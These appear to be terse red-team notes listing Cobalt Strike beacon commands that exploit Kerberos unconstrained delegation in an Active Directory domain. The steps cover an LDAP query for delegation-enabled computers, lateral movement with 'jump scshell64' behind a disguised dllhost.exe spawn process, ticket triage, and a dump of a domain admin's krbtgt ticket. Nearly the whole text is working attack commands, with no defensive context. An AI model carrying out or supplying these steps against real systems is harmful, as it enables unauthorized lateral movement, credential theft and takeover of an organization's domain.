use LDAP to find computers configured for unconstrained delegation
    beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
note any commputers found
    e.g. LON-WS-1$
impersonate a user to move laterally to lon-ws-1
    beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
    beacon> jump scshell64 lon-ws-1 smb
now we should have a new beacon running on lon-ws-1
triage tickets!
    beacon> krb_triage
confirm the user is a domain admin
    beacon> ldapsearch samAccountName=dyork --attributes memberOf
dump the ticket:
    beacon> krb_dump /user:dyork /service:krbtgt
